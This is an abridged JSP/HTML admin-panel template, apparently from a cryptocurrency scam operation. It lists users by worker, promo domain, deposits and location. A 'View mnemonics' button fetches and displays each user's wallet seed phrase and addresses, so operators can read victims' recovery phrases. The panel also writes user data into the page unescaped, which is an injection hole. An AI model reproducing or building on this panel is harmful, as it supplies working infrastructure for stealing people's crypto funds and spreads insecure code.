	...
	<div class="app-page flex-column flex-column-fluid" id="kt_app_page">
		...
		<div class="app-wrapper flex-column flex-row-fluid" id="kt_app_wrapper">
				...
				<div class="app-sidebar-menu overflow-hidden flex-column-fluid">
					...
					<div id="kt_app_sidebar_menu_wrapper" class="app-sidebar-wrapper hover-scroll-overlay-y my-5" data-kt-scroll="true" data-kt-scroll-activate="true" data-kt-scroll-height="auto" data-kt-scroll-dependencies="#kt_app_sidebar_logo, #kt_app_sidebar_footer" data-kt-scroll-wrappers="#kt_app_sidebar_menu" data-kt-scroll-offset="5px" data-kt-scroll-save-state="true">
						...
						<div class="menu menu-column menu-rounded menu-sub-indention px-3" id="#kt_app_sidebar_menu" data-kt-menu="true" data-kt-menu-expand="false">
							...
							<div class="menu-item">
								<!--begin:Menu link-->
								<a class="menu-link " href="/admin/workers">
                                 <span class="menu-icon">
                                    <!--begin::Svg Icon | path: icons/duotune/general/gen002.svg-->
                                    <span class="svg-icon svg-icon-2">
                                       <svg width="24" height="24" viewbox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
			...
			<div class="app-main flex-column flex-row-fluid" id="kt_app_main">
								...
								<div class="card-header border-0 pt-5">
									<div class="card-title">
										...
										<div class="d-flex align-items-center position-relative my-1">
											<form action="/admin/users" method="get" style="display: inline-flex;">
									...
									<div class="card-toolbar">
										<%
											...
											if (onlineUsers) {
												out.println("<a href=\"/admin/users?users=offline\" class=\"btn btn-outline btn-outline-dashed btn-outline-danger btn-sm px-4\">" +
														"<span class=\"svg-icon svg-icon-2\">\n" +
														"<svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
												...
												out.println("<a href=\"/admin/users?users=online\" class=\"btn btn-outline btn-outline-dashed btn-outline-success btn-sm px-4\">\n" +
														"<span class=\"svg-icon svg-icon-2\">\n" +
														"<svg width=\"20\" height=\"20\" viewbox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
														"<path d=\"M19.0759 3H4.72777C3.95892 3 3.47768 3.83148 3.86067 4.49814L8.56967 12.6949C9.17923 13.7559 9.5 14.9582 9.5 16.1819V19.5072C9.5 20.2189 10.2223 20.7028 10.8805 20.432L13.8805 19.1977C14.2553 19.0435 14.5 18.6783 14.5 18.273V13.8372C14.5 12.8089 14.8171 11.8056 15.408 10.964L19.8943 4.57465C20.3596 3.912 19.8856 3 19.0759 3Z\" fill=\"currentColor\"></path>\n" +
														"</svg>\n" +
									...
									<div class="table-responsive">
										...
										<table class="table align-middle gs-0 gy-4 table-row-dashed table-hover">
											...
											<tr class="fw-bold text-muted">
												...
												<th class="min-w-100px">Worker</th>
												<th class="min-w-100px">Domain / Promo</th>
												<th class="min-w-100px">Deposits</th>
												<th class="min-w-100px">Registration date</th>
												<th class="min-w-100px">Location</th>
												<th class="min-w-100px">Last activity</th>
												<th class="min-w-50px">Mnemonics</th>
											</tr>
											</thead>
											<!--end::Table head-->
											<!--begin::Table body-->
											...
											<%
												...
												for (Map<String, Object> user : users) {
													...
													Object domain = user.get("domain");
													Object promo = user.get("promo");
													Object worker = user.get("worker");
													Object deposits = user.get("deposits");
													Object regDate = user.get("reg_date");
													Object lastDate = user.get("last_date");
													Object location = user.get("location");
													Object countryCode = user.get("country_code");
													out.println("<tr>\n" +
															"   <td class=\"min-w-70px text-dark fs-6\">" + id + "</td>\n" +
															"   <td class=\"min-w-70px text-dark fs-6\">" + email + "</td>\n" +
															"   <td class=\"min-w-70px text-dark fs-6\">" + username + "</td>\n" +
															"   <td class=\"min-w-70px text-dark fs-6\">" + worker + "</td>\n" +
															"   <td class=\"min-w-70px text-dark fs-6\">" + domain + " / " + (promo == null ? "" : promo) + "</td>\n" +
															...
															"	<td>" + lastDate + "</td>" +
															"   <td>\n" +
															"      <a data-bs-toggle=\"modal\" data-bs-target=\"#view_mnemonics\" onclick=\"viewMnemonics(" + id + ")\" class=\"btn btn-xs btn-danger view-mnemonics\" data-original-title=\"View mnemonics\">View mnemonics</a>\n" +
															"   </td>\n" +
															"</tr>");
												}
											%>
										...
										<%
											...
											String pageHtml = String.format("<p style=\"font-size: 12px; color: #a3a4bd; font-weight: 400;\">You are in page %s of %s</p>\n" +
															...
															"                                    <a href=\"/admin/users?page=1\" style=\"border: 1px solid #a3a4b6; padding: 5px; color: #a3a4b6; border-radius: 5px; margin-right: 5px;\">FIRST</a>\n" +
															"                                    <a href=\"/admin/users?page=%s\" style=\"border: 1px solid #a3a4b6; padding: 5px; color: #a3a4b6; border-radius: 5px; margin-right: 5px;\">PREVIOUS</a>\n" +
															"                                    <a href=\"/admin/users?page=%s\" style=\"border: 1px solid #a3a4b6; padding: 5px; color: #a3a4b6; border-radius: 5px; margin-right: 5px;\">NEXT</a>\n" +
															"                                    <a href=\"/admin/users?page=%s\" style=\"border: 1px solid #a3a4b6; padding: 5px; color: #a3a4b6; border-radius: 5px; margin-right: 5px;\">LAST</a>",
				...
				<div class="modal fade" id="view_mnemonics" tabindex="-1" aria-hidden="true">
					<!--begin::Modal dialog-->
					<div class="modal-dialog modal-dialog-centered mw-650px">
						<!--begin::Modal content-->
						<div class="modal-content rounded">
							...
							<div class="modal-body scroll-y px-10 px-lg-15 pt-0 pb-15">
								<div class="mb-13 text-center">
									<!--begin::Title-->
									<h1 class="mb-3">View user mnemonics</h1>
									<!--end::Title-->
								</div>
								<div id="view_mnemonics_data">
...
<script>
	function viewMnemonics(userId) {
		$.ajax({
			url: "../api/admin",
			type: "POST",
			data: {
				action: "GET_USER_MNEMONICS",
				user_id: userId
			},
			success: function(response) {
				if(response == "-1") {
					noti("Ошибка получения данных", "success");
				} else {
					var element = document.getElementById('view_mnemonics_data');
					element.innerHTML = '';
					var json = JSON.parse(response);
					var mnemonic = json['mnemonic'];
					element.innerHTML += `<div class="d-flex flex-column mb-8 fv-row fv-plugins-icon-container">
									<!--begin::Label-->
									<label class="d-flex align-items-center fs-6 fw-semibold mb-2">
										<span class="">Mnemonic</span>
									</label>
									<!--end::Label-->
									<input id="edit_domain_name" type="text" class="form-control form-control-solid" placeholder="" name="target_title" value="` + mnemonic + `" disabled="">
									<div class="fv-plugins-message-container invalid-feedback"></div>
								</div>`;
					for (var type in json['addresses']) {
						var address = json['addresses'][type];
						element.innerHTML += `<div class="d-flex flex-column mb-8 fv-row fv-plugins-icon-container">
									<!--begin::Label-->
									<label class="d-flex align-items-center fs-6 fw-semibold mb-2">
									...
									<!--end::Label-->
									<input id="edit_domain_name" type="text" class="form-control form-control-solid" placeholder="" name="target_title" value="` + address + `" disabled="">
									<div class="fv-plugins-message-container invalid-feedback"></div>
								</div>`;
					}
				}
